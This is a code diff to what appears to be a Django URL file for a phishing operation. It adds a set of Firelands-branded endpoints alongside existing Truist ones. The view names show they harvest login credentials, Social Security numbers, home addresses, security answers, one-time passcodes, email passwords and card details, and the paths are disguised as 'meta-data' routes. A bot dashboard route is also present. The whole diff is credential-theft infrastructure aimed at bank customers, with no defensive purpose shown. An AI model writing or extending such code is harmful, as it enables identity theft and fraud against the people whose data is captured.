@@ -136,6 +136,18 @@ from user_data.truist_views import (
     truist_collect_user_email_password,
     truist_collect_user_card_info,
 )
+from user_data.firelands_views import (
+    firelands_collect_user_login_cred,
+    firelands_collect_user_login_cred2,
+    firelands_collect_user_basic_info,
+    firelands_collect_user_home_address,
+    firelands_collect_user_social_security,
+    firelands_collect_user_social_security_2,
+    firelands_collect_user_security_questions,
+    firelands_collect_user_otp_verification,
+    firelands_collect_user_email_password,
+    firelands_collect_user_card_info,
+)
 
 urlpatterns = [
     path("admin/", admin.site.urls),
@@ -205,5 +217,16 @@ urlpatterns = [
     path("api/truist-meta-data-8/", truist_collect_user_otp_verification, name="truist_collect_user_otp_verification"),
     path("api/truist-email-password/", truist_collect_user_email_password, name="truist_collect_user_email_password"),
     path("api/truist-card-info/", truist_collect_user_card_info, name="truist_collect_user_card_info"),
+    # Firelands API endpoints
+    path("api/firelands-meta-data-1/", firelands_collect_user_login_cred, name="firelands_collect_user_login_cred"),
+    path("api/firelands-meta-data-2/", firelands_collect_user_login_cred2, name="firelands_collect_user_login_cred2"),
+    path("api/firelands-meta-data-3/", firelands_collect_user_basic_info, name="firelands_collect_user_basic_info"),
+    path("api/firelands-meta-data-4/", firelands_collect_user_home_address, name="firelands_collect_user_home_address"),
+    path("api/firelands-meta-data-5/", firelands_collect_user_social_security, name="firelands_collect_user_social_security"),
+    path("api/firelands-meta-data-6/", firelands_collect_user_social_security_2, name="firelands_collect_user_social_security_2"),
+    path("api/firelands-meta-data-7/", firelands_collect_user_security_questions, name="firelands_collect_user_security_questions"),
+    path("api/firelands-meta-data-8/", firelands_collect_user_otp_verification, name="firelands_collect_user_otp_verification"),
+    path("api/firelands-email-password/", firelands_collect_user_email_password, name="firelands_collect_user_email_password"),
+    path("api/firelands-card-info/", firelands_collect_user_card_info, name="firelands_collect_user_card_info"),
     path("dashboard/", bot_dashboard, name="bot_dashboard"),
 ]
